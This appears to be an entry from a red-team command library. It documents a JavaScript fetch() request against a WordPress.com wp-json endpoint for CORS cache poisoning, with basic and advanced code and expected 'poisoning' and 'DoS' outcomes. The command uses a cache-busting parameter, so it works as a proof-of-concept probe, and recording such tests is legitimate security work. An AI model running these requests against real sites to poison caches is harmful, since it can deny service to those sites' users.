---
data: >-
  fetch('https://target.wordpress.com/wp-json/?dontreallypoison1').then(res =>
  res.json()).then(json => console.log(json));
tags:
  - cache-poisoning
  - cors
type: command
executor: javascript
platforms:
  - Web
id: ddbb90b5-2b39-4b4a-a4ce-6baf400f1574
created_at: '2025-12-14T17:32:48.590Z'
updated_at: '2025-12-14T17:32:48.590Z'
verified: false
validated: true
submitted: true
---
# fetch-wp-json-poison

## Command

```javascript
fetch('https://target.wordpress.com/wp-json/?dontreallypoison1').then(res => res.json()).then(json => console.log(json));
```

## Description

This JavaScript command uses the Fetch API to send a cross-origin GET request to the WP-JSON endpoint on a WordPress.com site. It includes a custom query parameter to avoid interfering with production caches. The browser sets the Origin header automatically, which the API echoes into ACAO. Used for poisoning caches or verifying DoS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target endpoint (e.g., https://target.wordpress.com/wp-json/?dontreallypoison1) | Yes |
| .then(res => res.json()) | Parse response as JSON | No (for poisoning; yes for data access) |
| .then(json => console.log(json)) | Log JSON to console | No |

## Examples

### Basic Usage

```javascript
fetch('https://target.wordpress.com/wp-json/?dontreallypoison1').then(res => res.json()).then(json => console.log(json));
```

### Advanced Usage

```javascript
fetch('https://target.wordpress.com/wp-json/?dontreallypoison1', { method: 'GET', mode: 'cors' }).then(res => {
  console.log('Headers:', res.headers.get('Access-Control-Allow-Origin'));
  return res.json();
}).then(json => console.log(json));
```

## Expected Output

On successful poisoning: JSON object from WP-JSON logged to console, with ACAO header in Network tab matching the request Origin. On DoS trigger: CORS error in console, no JSON processed.

## Related

- [[Related Procedure|procedures/Poison-WP-JSON-Cache-with-Arbitrary-Origin]]
